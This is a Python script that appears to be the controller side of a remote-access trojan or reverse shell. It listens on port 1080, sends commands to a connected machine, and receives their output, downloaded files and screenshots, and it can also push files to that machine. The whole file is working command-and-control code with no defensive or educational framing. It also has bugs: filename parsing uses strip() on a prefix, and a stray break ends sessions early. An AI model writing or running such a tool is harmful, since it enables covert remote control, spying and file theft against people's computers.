import socket
import os
import sys

eof = '<end_of_result>'
chunk_size = 2048


class TerminatingException(Exception):
    "Raised when the input value is stop"
    pass


class SP():
    def server(self):
        try:
            #                   IPV4                TCP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 1.Create a socket

            #                     IP                              Port
            s.bind((socket.gethostbyname(socket.gethostname()), 1080))  # 2. Bind to the socket
            s.listen(2)  # 3.Listen at the socket. Queue Capacity is 2 clients

            while True:
                try:
                    conn, addr = s.accept()  # the accept method blocks the loop, till a new connection is received
                    print(f"Got connection from {addr}")
                    while True:
                        command = input("Enter Command> ")
                        conn.send(command.encode('utf-8'))

                        if command == "":
                            continue

                        elif command.startswith('cd'):
                            # conn.send(command.encode())
                            continue

                        elif len(command) == 2 and command[0].isalpha() and command[1] == ':':  # --> d:
                            # conn.send(command.encode())
                            continue

                        elif command.startswith("download"):
                            # conn.send(command.encode())
                            exists = conn.recv(1024)
                            if exists.decode() == "yes":
                                file_name = command.strip("download ")
                                with open(file_name, "wb") as download_file:
                                    print("Downloading file")
                                    while True:
                                        chunk = conn.recv(chunk_size)
                                        if chunk.endswith(eof.encode()):
                                            chunk = chunk[:-len(eof)]
                                            download_file.write(chunk)
                                            break
                                        download_file.write(chunk)
                                print("Successfully downloaded, ", file_name)
                                continue
                            else:
                                print("File doesn't exist")
                                continue

                        elif command.lower() == 'stop':
                            print(conn.recv(1024).decode())
                            raise TerminatingException
                            break

                        elif command.startswith("upload"):
                            file_to_upload = command.strip("upload ")
                            if os.path.exists(file_to_upload) and os.path.isfile(file_to_upload):
                                print('im in')
                                exists = "yes"
                                conn.send(exists.encode())
                                answer = conn.recv(1024)
                                if answer.decode() == "yes":
                                    with open(file_to_upload, "rb") as file:
                                        chunk = file.read(chunk_size)
                                        print("Uploading FIle ... ")
                                        while len(chunk) > 0:
                                            conn.send(chunk)
                                            chunk = file.read(2048)
                                            # This will run till the end of file.

                                        # once the file is complete, we need to send the marker.
                                        conn.send(eof.encode())
                                    print("File sent successfully")
                            else:
                                exists = "no"
                                print("File doesn't exist")
                                conn.send(exists.encode())
                                continue

                        elif command == "screenshot":
                            print("taking screenshot")
                            file_name = conn.recv(1024)
                            exists = conn.recv(1024)
                            if exists.decode() == "yes":
                                answer = "yes"
                                conn.send(answer.encode())

                                with open(file_name, "wb") as download_file:
                                    print("Downloading file")
                                    while True:
                                        chunk = conn.recv(chunk_size)
                                        if chunk.endswith(eof.encode()):
                                            chunk = chunk[:-len(eof)]
                                            download_file.write(chunk)
                                            break
                                        download_file.write(chunk)

                                print("File Downloaded successfully")
                            else:
                                print("File not exists")
                                continue

                        else:
                            full_result = bytes()
                            while True:
                                chunk_result = conn.recv(1024)
                                if chunk_result.endswith(eof.encode()):
                                    chunk_result = chunk_result[:-len(eof)]
                                    full_result += chunk_result
                                    break
                                else:
                                    full_result += chunk_result

                            if full_result:
                                print(f"\nGot result: \nget{str(full_result.decode('utf-8'))}")
                            else:
                                print(f"No more result from client: {str(addr)}")
                                break
                        break
                finally:
                    conn.close()



        except TerminatingException as ex:
            print(f"Terminating Server.. ")
            s.close()

        except BaseException as ex:
            print(f"Exception caught : {str(ex)}")
            s.close()
            sys.exit()


s = SP()
s.server()
